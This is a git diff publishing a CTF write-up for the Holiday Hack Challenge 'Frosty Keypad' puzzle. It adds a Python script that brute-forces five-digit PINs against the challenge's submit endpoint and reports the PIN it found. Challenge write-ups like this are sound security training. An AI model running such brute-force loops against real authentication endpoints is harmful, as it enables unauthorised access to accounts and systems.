@@ -1,7 +1,7 @@
 +++
 title = 'Frosty Keypad'
 date = 2024-11-17T14:19:14+01:00
-draft = true
+draft = false
 weight = 2
 +++
 
@@ -88,3 +88,28 @@ After just a couple of seconds, it produced the correct pin code:
 As evident here, the pincode got accepted: 
 
 ![Frosty Keypad 3](/images/act1/frosty-keypad-3.png)
+
+### Gold solution
+
+There's a second pincode to be found that doesn't fit the tips already given. Time to modify the above script and bruteforce the solution: 
+
+```python
+import requests, itertools, time
+
+for perm in [''.join(p) for p in itertools.product(['2', '6', '7', '8'], repeat=5)]:
+		print(f"trying '{perm}' ... ", end="")
+		res = requests.post(
+			"https://hhc24-frostykeypad.holidayhackchallenge.com/submit",
+			json = { "answer": perm }
+		)
+
+		if res.status_code != 400:
+			print(f"{res.status_code} - {res.json()} - {perm}")
+		else:
+			print(" Negative")
+			time.sleep(1)
+```
+
+This script found the other pincode within seconds: 22786
+
+![Frosty Keypad 3](/images/act1/frosty-keypad-4.png)
